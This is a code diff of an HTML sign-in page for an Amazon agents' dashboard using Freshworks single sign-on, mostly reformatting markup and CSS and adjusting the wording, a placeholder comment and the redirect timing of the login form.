@@ -49,7 +49,7 @@
     input:focus { border-color: var(--orange); box-shadow: 0 0 0 3px rgba(255,153,0,0.12); background: rgba(255,153,0,0.04); }
     input::placeholder { color: rgba(255,255,255,0.2); }
     .pw-wrap { position: relative; }
-    .toggle-pw { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: var(--muted); padding: 0; display: flex; align-items: center; }
+    .toggle-pw { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: var(--muted); padding: 0; display: flex; align-items: center; transition: color 0.2s; }
     .toggle-pw:hover { color: var(--orange); }
     .btn { width: 100%; margin-top: 8px; padding: 15px; background: var(--orange); color: #111; font-family: 'DM Sans', sans-serif; font-size: 15px; font-weight: 700; border: none; border-radius: 10px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.22s ease; }
     .btn:hover { background: #ffaa22; transform: translateY(-1px); box-shadow: 0 10px 30px rgba(255,153,0,0.35); }
@@ -91,12 +91,17 @@
       </div>
       <div class="card">
         <div class="card-title">Agent Sign In</div>
-        <div class="card-sub">Enter your credentials to access the Amazon dashboard directly — no second login.</div>
-        <div class="alert error" id="errorMsg"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg><span id="errorText"></span></div>
-        <div class="alert success" id="successMsg"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Verified! Opening your dashboard now...</div>
+        <div class="card-sub">Amazon agents only. Enter your credentials to access the dashboard.</div>
+        <div class="alert error" id="errorMsg">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+          <span id="errorText"></span>
+        </div>
+        <div class="alert success" id="successMsg">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+          Verified! Opening your dashboard...
+        </div>
         <form id="loginForm">
           <input type="hidden" name="portal" value="amazon"/>
-          <!-- STATE_NONCE_PLACEHOLDER -->
           <div class="field">
             <label for="email">Work Email</label>
             <input type="email" id="email" name="email" placeholder="you@amazon.com" required autocomplete="email"/>
@@ -105,7 +110,9 @@
             <label for="password">Password</label>
             <div class="pw-wrap">
               <input type="password" id="password" name="password" placeholder="••••••••" required/>
-              <button type="button" class="toggle-pw" onclick="togglePw()"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button>
+              <button type="button" class="toggle-pw" onclick="togglePw()">
+                <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+              </button>
             </div>
           </div>
           <button type="submit" class="btn" id="loginBtn">
@@ -113,7 +120,10 @@
             <span id="btnText">Access Dashboard →</span>
           </button>
         </form>
-        <div class="secure"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Secured by Freshworks JWT SSO</div>
+        <div class="secure">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Secured by Freshworks JWT SSO
+        </div>
       </div>
     </div>
   </main>
@@ -123,6 +133,7 @@
       const pw = document.getElementById('password');
       pw.type = pw.type === 'password' ? 'text' : 'password';
     }
+
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const btn = document.getElementById('loginBtn');
@@ -131,19 +142,27 @@
       const errorMsg = document.getElementById('errorMsg');
       const errorText = document.getElementById('errorText');
       const successMsg = document.getElementById('successMsg');
+
       errorMsg.classList.remove('show');
       successMsg.classList.remove('show');
       btn.disabled = true;
       spinner.style.display = 'block';
       btnText.textContent = 'Verifying...';
+
       const body = new URLSearchParams(new FormData(e.target));
+
       try {
-        const res = await fetch('/login', { method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: body.toString() });
+        const res = await fetch('/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: body.toString()
+        });
         const data = await res.json();
+
         if (data.success && data.redirectUrl) {
           successMsg.classList.add('show');
           btnText.textContent = 'Redirecting...';
-          setTimeout(() => { window.location.href = data.redirectUrl; }, 800);
+          setTimeout(() => { window.location.href = data.redirectUrl; }, 1000);
         } else {
           errorText.textContent = data.error || 'Invalid credentials.';
           errorMsg.classList.add('show');
